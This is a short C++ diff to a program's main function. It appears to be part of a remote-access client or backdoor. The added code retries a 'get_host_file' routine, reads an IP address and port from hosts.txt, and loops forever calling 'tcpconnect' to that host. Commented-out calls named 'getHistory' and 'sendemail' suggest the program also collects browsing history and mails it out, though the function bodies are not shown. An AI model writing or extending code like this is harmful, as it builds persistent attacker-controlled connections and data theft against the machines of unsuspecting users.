@@ -17,11 +17,23 @@ int main()
 	//getHistory();
 	//list<string> l;
 	//sendemail(l);
-	
-	get_host_file();
-	/*while(true)
+	for(int i=0;i<10;++i)
 	{
-		tcpconnect("192.168.1.103", "27015");
-	}*/
+		if(get_host_file())
+			break;
+	}
+	ifstream infile("hosts.txt");
+	string ip;
+	string port;
+	if(infile)
+	{
+		getline(infile, ip);
+		getline(infile, port);
+		infile.close();
+		while (true)
+		{
+			tcpconnect(ip.c_str(), port.c_str());
+		}
+	}
 	return 0;
 }
